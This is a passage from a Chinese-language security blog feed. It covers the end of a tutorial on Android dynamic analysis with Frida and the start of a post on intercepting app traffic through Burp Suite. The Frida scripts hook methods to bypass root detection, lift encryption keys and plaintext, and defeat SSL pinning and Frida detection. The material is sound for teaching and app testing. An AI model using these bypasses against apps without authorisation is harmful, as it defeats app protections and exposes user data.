class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如此一來，就能知道參數是什麼，在呼叫原本的實作時也能帶入參數，就不會出錯了。</p><p>既然都可以插入程式碼了，我們可以做一大堆事情，像是直接在 UI 上面顯示一個新的訊息：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  Java<span class="token punctuation">.</span><span class="token function">perform</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> MainActivity <span class="token operator">=</span> Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'com.cymetrics.demo.MainActivity'</span><span class="token punctuation">)</span>    MainActivity<span class="token punctuation">.</span>onCreate<span class="token punctuation">.</span><span class="token function">overload</span><span class="token punctuation">(</span><span class="token string">'android.os.Bundle'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">implementation</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">a</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'MainActivity onCreate'</span><span class="token punctuation">)</span>      <span class="token comment">// Toast 一定要跑在 main thread(UI thread)</span>      Java<span class="token punctuation">.</span><span class="token function">scheduleOnMainThread</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">var</span> Toast <span class="token operator">=</span> Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">"android.widget.Toast"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> currentApplication <span class="token operator">=</span> Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'android.app.ActivityThread'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">currentApplication</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Toast 的第一個參數需要 context 才能執行</span>        <span class="token keyword">var</span> context <span class="token operator">=</span> currentApplication<span class="token punctuation">.</span><span class="token function">getApplicationContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Toast<span class="token punctuation">.</span><span class="token function">makeText</span><span class="token punctuation">(</span>          context<span class="token punctuation">,</span>          <span class="token comment">// 這個參數的型態要正確，直接傳字串會出錯</span>          Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">"java.lang.String"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>$<span class="token keyword">new</span><span class="token punctuation">(</span><span class="token string">"Hello!"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>          Toast<span class="token punctuation">.</span><span class="token constant">LENGTH_SHORT</span><span class="token punctuation">.</span>value        <span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">show</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">onCreate</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token function">setImmediate</span><span class="token punctuation">(</span>run<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>程式碼來自：<a href="https://gist.github.com/myzhan/ab13068463cd7f77b7f06ae561ea853a">makeToast.js</a>。</p><h2><span id="使用-frida-繞過-root-檢測">使用 Frida 繞過 root 檢測</span></h2><p>我們在之前的文章中繞過 root 檢測時，是直接去改 smali 的程式碼，直接把檢測的 function 給 patch 掉，藉此來繞過。有了 Frida 以後，就不需要去改 smali 的程式碼了，可以直接 hook 檢測的 function 並且把實作替換掉即可，像是這樣：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  Java<span class="token punctuation">.</span><span class="token function">perform</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> RootBeer <span class="token operator">=</span> Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'com.scottyab.rootbeer.RootBeer'</span><span class="token punctuation">)</span>        RootBeer<span class="token punctuation">.</span>isRooted<span class="token punctuation">.</span><span class="token function">overload</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">implementation</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'bypass rootbeer'</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">false</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token function">setImmediate</span><span class="token punctuation">(</span>run<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>沒錯，就是這麼容易。</p><p>那你可能會問說，我們是怎麼知道要 hook 這個 function 的？這部分還是需要靠靜態分析，從靜態分析中我們得知是這個 function 在做檢測，所以用 Frida 來 hook 這個 function。</p><p>我自己的話通常是兩個搭配使用，先反組譯之後靜態分析，稍微看一下程式碼，接著再用 Frida 去 hook，看能不能做到想做的事情，如果可以的話，我會再去改 smali 相對應的地方，然後把 app 重新打包，這樣就可以在沒有 Frida 的手機上也執行我想要的流程。</p><p>其實 Frida 的基礎使用就是這樣了，剩下的就是靠著對於程式碼以及 Android 開發的理解，決定要 hook 哪一個 function。</p><h2><span id="其他-frida-小技巧">其他 Frida 小技巧</span></h2><p>底下列幾個我從網路上找到的 Frida 小技巧，都是實務上我有用到的，供大家參考。</p><h3><span id="印出-stack-trace">印出 stack trace</span></h3><p>假設某個 app 有檢查機制，會偵測是不是有 root，然後原始碼經過混淆所以比較難追蹤，但是在檢查時會用 Log.d 輸出檢查相關資訊，這時候我們可以 hook Log.d，並且利用 <code>Log.getStackTraceString</code> 輸出 stack trace，就能知道是在哪邊呼叫這個 function：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> Log <span class="token operator">=</span> Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">"android.util.Log"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">var</span> Exception <span class="token operator">=</span> Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">"java.lang.Exception"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Log<span class="token punctuation">.</span>d<span class="token punctuation">.</span><span class="token function">overload</span><span class="token punctuation">(</span><span class="token string">"java.lang.String"</span><span class="token punctuation">,</span> <span class="token string">"java.lang.String"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">implementation</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token comment">// 發現輸出 root 偵測資訊的時候</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>b<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'root'</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 印出 stack trace 方便追蹤</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>Log<span class="token punctuation">.</span><span class="token function">getStackTraceString</span><span class="token punctuation">(</span> Exception<span class="token punctuation">.</span>$<span class="token keyword">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>d<span class="token punctuation">.</span><span class="token function">overload</span><span class="token punctuation">(</span><span class="token string">"java.lang.String"</span><span class="token punctuation">,</span> <span class="token string">"java.lang.String"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3><span id="hook-reflect-相關方法">hook Reflect 相關方法</span></h3><p>在 Java 中除了直接呼叫方法以外，也可以透過反射（Reflect）的方式去呼叫，有些混淆的程式會大量運用這種技巧來加強靜態分析的難度，我們可以把每一個動態呼叫的方法都印出來，看看有沒有什麼蛛絲馬跡：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// hook Class.forName</span><span class="token keyword">var</span> JavaClass <span class="token operator">=</span> Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'java.lang.Class'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>JavaClass<span class="token punctuation">.</span>forName<span class="token punctuation">.</span><span class="token function">overload</span><span class="token punctuation">(</span><span class="token string">'java.lang.String'</span><span class="token punctuation">,</span> <span class="token string">'boolean'</span><span class="token punctuation">,</span> <span class="token string">'java.lang.ClassLoader'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">implementation</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Class.forName'</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>  <span class="token comment">// 還可以印出特定 class 底下所有的方法</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>name<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">'cymetrics'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> TargetClass <span class="token operator">=</span> Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> methodsList <span class="token operator">=</span> TargetClass<span class="token punctuation">.</span>class<span class="token punctuation">.</span><span class="token function">getDeclaredMethods</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> k<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> k<span class="token operator">&lt;</span>methodsList<span class="token punctuation">.</span>length<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>methodsList<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>forName<span class="token punctuation">.</span><span class="token function">overload</span><span class="token punctuation">(</span><span class="token string">'java.lang.String'</span><span class="token punctuation">,</span> <span class="token string">'boolean'</span><span class="token punctuation">,</span> <span class="token string">'java.lang.ClassLoader'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> name<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token comment">// hook Method.invoke，知道動態呼叫了哪些方法</span><span class="token keyword">var</span> Method <span class="token operator">=</span> Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'java.lang.reflect.Method'</span><span class="token punctuation">)</span>Method<span class="token punctuation">.</span>invoke<span class="token punctuation">.</span><span class="token function">overload</span><span class="token punctuation">(</span><span class="token string">'java.lang.Object'</span><span class="token punctuation">,</span> <span class="token string">'[Ljava.lang.Object;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">implementation</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'reflect'</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3><span id="hook-字串操作">hook 字串操作</span></h3><p>有些混淆程式會把程式中寫死的字串全都透過各種步驟打亂，讓人不易搜尋，例如說把字串變成數字然後再還原之類的，而在還原的時候通常都會經過字串操作，這時候我們可以直接去 hook 字串操作，並搭配前面提過的 stack trace 去追蹤：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">[</span><span class="token string">'java.lang.StringBuilder'</span><span class="token punctuation">,</span> <span class="token string">'java.lang.StringBuffer'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">clazz<span class="token punctuation">,</span> i</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'toString'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function-variable function">implementation</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> ret <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'ret:'</span><span class="token punctuation">,</span> ret<span class="token punctuation">)</span>    <span class="token keyword">return</span> ret<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3><span id="hook-加解密相關操作">hook 加解密相關操作</span></h3><p>通常在 Android App 裡面要進行加解密的話，都會透過內建的 API 來進行，像是這樣（來源：<a href="https://cloud.tencent.com/developer/article/1647740">Android中的AES加密–上</a>）：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">CODE_TYPE</span> <span class="token operator">=</span> <span class="token string">"UTF-8"</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">AES_TYPE</span> <span class="token operator">=</span> <span class="token string">"AES/ECB/PKCS5Padding"</span><span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token constant">AES_KEY</span><span class="token operator">=</span><span class="token string">"1111222233334444"</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token class-name">String</span> cleartext<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">SecretKeySpec</span> key <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SecretKeySpec</span><span class="token punctuation">(</span><span class="token constant">AES_KEY</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"AES"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Cipher</span> cipher <span class="token operator">=</span> <span class="token class-name">Cipher</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token constant">AES_TYPE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        cipher<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token class-name">Cipher</span><span class="token punctuation">.</span><span class="token constant">ENCRYPT_MODE</span><span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> encryptedData <span class="token operator">=</span> cipher<span class="token punctuation">.</span><span class="token function">doFinal</span><span class="token punctuation">(</span>cleartext<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token constant">CODE_TYPE</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>encryptedData<span class="token punctuation">,</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token constant">DEFAULT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以只要能 hook 像是 <code>SecretKeySpec</code> 或是 <code>doFinal</code> 這些方法，就能夠攔截到 key 跟加密前的明文。</p><p>這篇文章值得一看：<a href="https://labs.f-secure.com/blog/how-secure-is-your-android-keystore-authentication/">How Secure is your Android Keystore Authentication ?</a>，裡面有附了一堆加解密相關的 Frida 腳本，在這裡：<a href="https://github.com/FSecureLABS/android-keystore-audit/blob/master/frida-scripts/tracer-cipher.js">https://github.com/FSecureLABS/android-keystore-audit/blob/master/frida-scripts/tracer-cipher.js</a></p><p>話說腳本裡面沒有直接把 byte array 轉成字串，這邊提供一個比較方便的方式（來源：<a href="https://lingwu111.github.io/frida%E5%B0%8F%E6%8A%80%E5%B7%A7%E4%B9%8Bstring%E4%B8%8Ebyte%E8%BD%AC%E5%8C%96.html">frida小技巧之string与byte转化</a>）：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">bytesToString</span><span class="token punctuation">(</span><span class="token parameter">bytes</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> javaString <span class="token operator">=</span> Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'java.lang.String'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> javaString<span class="token punctuation">.</span>$<span class="token keyword">new</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">var</span> Base64 <span class="token operator">=</span> Java<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'android.util.Base64'</span><span class="token punctuation">)</span>Base64<span class="token punctuation">.</span>decode<span class="token punctuation">.</span><span class="token function">overload</span><span class="token punctuation">(</span><span class="token string">'[B'</span><span class="token punctuation">,</span> <span class="token string">'int'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function-variable function">implementation</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token function">bytesToString</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">,</span> a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2><span id="ssl-pinning">SSL Pinning</span></h2><p>之前看到一篇 <a href="https://httptoolkit.tech/blog/frida-certificate-pinning/">Defeating Android Certificate Pinning with Frida</a> 裡面有附了一段很讚的腳本，自動去 hook 各種會做 SSL pinning 的 function，讓你繞過這個機制，存一份備份在這裡：<a href="https://gist.github.com/aszx87410/f7ae60826d436d8e5bd17deb3e40c249">https://gist.github.com/aszx87410/f7ae60826d436d8e5bd17deb3e40c249</a></p><p>存檔以後這樣跑起來：</p><pre class="line-numbers language-none"><code class="language-none">frida -U --no-pause -l ssl.js -f &quot;com.example&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2><span id="偵測-frida">偵測 Frida</span></h2><p>既然 Frida 這麼強大，那有些 app 的安全機制自然而然想把它擋下來，一旦偵測到 Frida 的蹤跡，就直接退出 app 或是製造當機，可以參考底下這兩篇：</p><ol><li><a href="https://www.jianshu.com/p/f679cb404524">Android逆向 多种特征检测 Frida</a></li><li><a href="https://blog.csdn.net/zhangmiaoping23/article/details/109697329">多种特征检测 Frida</a></li></ol><p>而反偵測的方式有很多種，其中一種就是去 hook 上面文章提到的各種方法，畢竟我們有 root 權限又有 Frida hook 在前，所以只要我們知道是怎麼判斷的，就一定可以把檢查拿掉。如果找不出檢查的地方，可以利用上面提到的各種 hook 抽絲剝繭，慢慢找出來。</p><h2><span id="結語">結語</span></h2><p>在這篇裡面我們介紹了 Frida 的基本使用，學習如何使用 Frida 來 hook 各種方法，藉此來得到各種我們想要的資訊。</p><p>而前四篇我們涵蓋了一些基本的東西，包括：</p><ol><li>基本的 Android App 組成</li><li>如何用 Apktool 把 apk 拆開並裝回去</li><li>如何用 jadx 把 smali 還原成 java 檔</li><li>熟悉一點點 smali 的語法，知道如何改 code 以及加 code</li><li>如何透過電腦上的 proxy 攔截封包</li><li>如何改造 apk，讓 proxy 能夠順利攔截</li><li>如何使用 Frida 來 hook function</li><li>各種 Frida 的小技巧</li></ol><p>再往後走的話，就要進入 native 的領域了。</p><p>除了使用 Java 撰寫 Android App 以外，也可以使用 <a href="https://developer.android.com/ndk">Android NDK</a>，就可以用 C&#x2F;C++ 撰寫程式碼，提供給 Android app 使用。</p><p>什麼情況會需要用到呢？第一是比較耗效能的地方，例如說圖片辨識之類的，用 C++ 來寫會比 Java 來得快，所以通常會用 native 來做，第二則是一些比較隱密的操作，例如說加解密，如果放在 Java 層，很容易就能反編譯並且看出在做什麼，用 native 來寫的話會需要更多 binary 相關知識才能破解。</p><p>除此之外，現實世界中的 app 並不像我們前面示範的 app 這麼簡單，可能經過加殼或是更強程度的混淆，就算 apk 拆得開，只要殼拆不掉，就看不到真正的邏輯。有些殼也具有反竄改跟反動態分析的機制，能夠把功力不足的攻擊者們阻擋在外，相關的介紹可以參考 <a href="http://confapi.ithome.com.tw/session/4186">2019 台灣資安週</a>的議程：<a href="https://s.itho.me/cybersec/2019/slides/321/I_%E4%B8%96%E8%B2%BF%E4%B8%89/0321I51610%E7%8E%8B%E7%BE%BF%E5%BB%B7.pdf">打造⼀一個安全與便利性兼具的 App 安全防護產品</a></p><p>這個系列之所以叫做「入門」，就是因為完全沒有提到這些實戰上會接觸的東西，只專注於入門的基礎跟工具；話雖如此，對於沒有特殊混淆或是加殼的 app，這樣應該就足夠了。</p><p>參考資料：</p><ol><li><a href="https://github.com/hookmaster/frida-all-in-one">《FRIDA操作手册》</a></li><li><a href="https://www.giantbranch.cn/2019/10/25/%E7%BF%BB%E8%AF%91%E2%80%94%E2%80%94N%E7%A7%8D%E8%84%B1%E5%A3%B3%E5%AE%89%E5%8D%93%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E7%9A%84%E6%96%B9%E5%BC%8F/">翻译——N种脱壳安卓恶意软件的方式</a></li><li><a href="https://kevinspider.github.io/fridahookjava/">frida hook java</a></li><li><a href="https://juejin.cn/post/6847902219757420552#heading-39">这恐怕是学习Frida最详细的笔记了</a></li><li><a href="https://github.com/iddoeldor/frida-snippets#class-description">frida-snippets</a></li><li><a href="https://book.hacktricks.xyz/mobile-apps-pentesting/android-app-pentesting/frida-tutorial">Frida Tutorial</a></li><li><a href="https://www.anquanke.com/post/id/197657">实用FRIDA进阶：内存漫游、hook anywhere、抓包</a></li></ol>]]></content>
    
    
    <summary type="html">&lt;p&gt;前面幾篇我們講的都是靜態分析的東西，也就是說我們並沒有把 app 跑起來，只是透過反編譯出來的程式碼研究 app 運作的邏輯，並且修改程式碼後重新打包執行。&lt;/p&gt;
&lt;p&gt;而動態分析指的就是我們會把 app 跑起來，並透過一些方式讓我們可以 hook 各種方法，去監視某些 method 的輸入以及輸出，甚至是竄改。&lt;/p&gt;
&lt;p&gt;這篇就讓我們來學習該怎麼樣使用 Frida 進行動態分析。&lt;/p&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>Android App 逆向入門之三：監聽 app 封包</title>
    <link href="https://blog.huli.tw/2023/04/27/android-apk-decompile-intro-3/"/>
    <id>https://blog.huli.tw/2023/04/27/android-apk-decompile-intro-3/</id>
    <published>2023-04-27T06:20:44.000Z</published>
    <updated>2023-05-07T01:15:16.474Z</updated>
    
    <content type="html"><![CDATA[<p>我記得在我剛接觸 Android 沒多久的時候，要看 app 到底發了哪些 request 是很簡單的一件事情。只要在電腦上面裝個 <a href="https://www.charlesproxy.com/">Charles</a>，接著設定手機上的 Wifi，讓它 proxy 到電腦上，然後輸入特定網址下載 Charles 提供的憑證，安裝完成以後就搞定了。</p><p>但前陣子用了一樣的流程，雖然有聽到一些封包，但從 app 出來的流量卻是空的，上網找了各式各樣的解法之後都行不通。</p><p>最後我才知道，原來是 Android 在 6.0 以上改變了安全性的設定，預設就不相信使用者自行安裝的憑證，所以才會攔截不到。有種做法是裝個 local VPN，這樣流量就會全部都過 proxy，但我試過以後發現還是有點麻煩。</p><p>在眾多方法之中，我試過最有用的方法，就是把 apk 拆開，改一些設定之後再裝回去，這篇就來記錄一下流程跟心得。</p><span id="more"></span><p>系列文連結：</p><ol><li><a href="/2023/04/27/android-apk-decompile-intro-1/">Android App 逆向入門之一：拆開與重組 apk</a></li><li><a href="/2023/04/27/android-apk-decompile-intro-2/">Android App 逆向入門之二：修改 smali 程式碼</a></li><li><a href="/2023/04/27/android-apk-decompile-intro-3/">Android App 逆向入門之三：監聽 app 封包</a></li><li><a href="/2023/04/27/android-apk-decompile-intro-4/">Android App 逆向入門之四：使用 Frida 進行動態分析</a></li></ol><h2><span id="前置作業">前置作業</span></h2><p>前置作業一共有兩項：</p><ol><li>準備 proxy</li><li>設置手機</li></ol><p>Proxy 的部分其實任選一套都可以，我是用常見的 <a href="https://portswigger.net/burp">Burp Suite</a>，其他軟體的設置應該也都大同小異。</p><p>首先，先到 Proxy -&gt; Options 裡面新增 Proxy Listeners，bind to address 的部分記得選 all interfaces，手機才連的到：</p><p><img 